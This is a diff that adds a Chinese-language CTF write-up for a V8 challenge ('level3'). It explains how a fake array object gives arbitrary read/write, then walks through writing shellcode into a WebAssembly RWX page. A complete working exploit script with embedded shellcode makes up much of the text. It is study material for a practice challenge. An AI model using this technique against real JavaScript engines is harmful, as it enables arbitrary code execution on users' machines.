@@ -82,3 +82,68 @@ if len(data)%4!=0:
 integers = bytes_to_int32_array(data, byte_order='little')
 print(integers)
 ```
+## level3
+
+开始上难度了。这题提供的`GetAddressOf`与上一题相同，另外一个功能是`GetFakeObject`，用于在指定地址（tageed compressed pointer）创建一个heapObject并返回。没啥头绪，但是找到了一篇比较像的wp： https://faraz.faith/2019-12-13-starctf-oob-v8-indepth 。那道题的漏洞是数组越界写（和教程Part 6差不多），也是通过构造fake object来实现任意地址读写然后写shellcode
+
+教程Part 5提到“v8里几乎所有东西都是HeapObject”。这意味着数组也不例外。数组内部的结构参考教程Part 6里的“图” `begin victim`那部分。可以发现就四个内容：`map ptr`，`properties ptr`,`backing store ptr`和`length of array `（各个字段的顺序不同版本不一样，但总归就这四个东西）。这里我又参考了上面那篇wp，发现数组读写只关乎于`map ptr`和`backing store ptr`(即数组元素)。于是可以利用`GetFakeObject`伪造具有任意`backing store ptr`的“数组”，实现相对于基地址的任意地址读写，后续就和上一题一样了
+
+最开始想着完全自己伪造一个数组。但是`map ptr`指向的内容太复杂，不可能。遂参考wp，沿用一个已知数组的`map ptr`即可。map的类型决定数组该如何进行数据读写，因此这里用float（double）数组的map，可以进行64位的读写。而且虽然说只有两个字段重要，我在脚本里也把其他字段按照正常数组的结构补上了。可能没啥用，但至少程序崩溃时我可以少看一个地方
+
+还有一点是，wp“年代久远”，当时v8还没有指针压缩机制。因此用来构造fake object的`arb_rw_arr`中有四个元素。现在只需要两个就好了。同理，拿`map ptr`时也从同样有两个元素的float数组拿。这里我也不确定是不是必须的，但伪造的内容多点总没有坏处
+```js
+var buf = new ArrayBuffer(8);
+var f64_buf = new Float64Array(buf);
+var u64_buf = new Uint32Array(buf);
+function ftoi(val) {
+    f64_buf[0] = val;
+    return BigInt(u64_buf[0]) + (BigInt(u64_buf[1]) << 32n);
+}
+function itof(val) {
+    u64_buf[0] = Number(val & 0xffffffffn);
+    u64_buf[1] = Number(val >> 32n);
+    return f64_buf[0];
+}
+function shift32(i) {
+	return i << 32n;
+}
+RWX_PAGE_OFFSET=0x2c0fc;
+ELEMENTS_OFFSET=-0x10
+var float_arr = [1.1, 1.2];
+var float_arr_map = GetAddressOf(float_arr)+0x187fbd;
+var arb_rw_arr = [itof(shift32(0x725n)+BigInt(float_arr_map)), 1.2];
+function arb_read(addr) {
+    arb_rw_arr[1]=itof(shift32(4n)+BigInt(addr-8));
+    let fake = GetFakeObject(GetAddressOf(arb_rw_arr)+ELEMENTS_OFFSET);
+    return ftoi(fake[0]);
+}
+function arb_write(addr, val) {
+    arb_rw_arr[1]=itof(shift32(4n)+BigInt(addr-8));
+    let fake = GetFakeObject(GetAddressOf(arb_rw_arr)+ELEMENTS_OFFSET);
+    fake[0] = itof(BigInt(val));
+}
+var wasm_code = new Uint8Array([0,97,115,109,1,0,0,0,1,133,128,128,128,0,1,96,0,1,127,3,130,128,128,128,0,1,0,4,132,128,128,128,0,1,112,0,0,5,131,128,128,128,0,1,0,1,6,129,128,128,128,0,0,7,145,128,128,128,0,2,6,109,101,109,111,114,121,2,0,4,109,97,105,110,0,0,10,138,128,128,128,0,1,132,128,128,128,0,0,65,42,11]);
+var wasm_mod = new WebAssembly.Module(wasm_code);
+var wasm_instance = new WebAssembly.Instance(wasm_mod);
+var f = wasm_instance.exports.main;
+var rwx_page_addr = arb_read(GetAddressOf(wasm_instance)+RWX_PAGE_OFFSET+1);
+console.log(rwx_page_addr);
+var shellcode=[23486568, 607420673, 16843009, 1701296200, 1952539439, 1213230182, 1751330744, 1701604449, 2303217774, 835858919, 1480289014, 1295];
+let shellcode_buf = new ArrayBuffer(shellcode.length * 4);
+let dataview = new DataView(shellcode_buf);
+let buf_addr = GetAddressOf(shellcode_buf);
+let backing_store_addr = buf_addr + 0x25;
+arb_write(backing_store_addr,rwx_page_addr);
+for (let i = 0; i < shellcode.length; i++) {
+	dataview.setUint32(4 * i, shellcode[i], true);
+}
+f();
+while(1){}
+```
+`GetAddressOf(arb_rw_arr)`获取`arb_rw_arr`的地址后找到其元素的起始地址作为fake object的地址。`addr-8`是因为数组并不直接从`backing store ptr`起始处进行读写，而是`backing store ptr`+8。这点可以通过DebugPrint一个正常的数组并查看其`backing store ptr`与元素实际存储的位置确定
+
+以及我的脚本写得很乱，难以区分参数到底是tagged pointer还是普通pointer。这题不复杂所以我没晕，但感觉再不改掉这个习惯就要晕了
+
+最后是不得不品的调试环节。它竟然能这么不稳定。上一题发现增减语句会导致偏移不对，没想到怎么唤起的d8也能影响偏移。我的exp首先在pwndbg里打印出了flag，但运行run时不行。最后在脚本末尾加了句`while(1){}`，然后用pwndbg attach找的偏移
+
+还好这题会变的偏移其实只有两个，float_arr_map的偏移和rwx_page_addr的偏移。我一直习惯一步完成后再写下一步，但放到v8里会非常痛苦。第一步成功后去写第二步，写完后第一步废了；改完后去写第三步，写完后第一步第二步全废了……不断循环。这题exp的逻辑很清晰，所以更好的做法应该是先一次写完exp，标记会变的偏移后再用一次调试确定全部的偏移。但这个做法后续题目复杂了就不好用了吧，至少我是绝对没有一次完成exp全部步骤的能力的
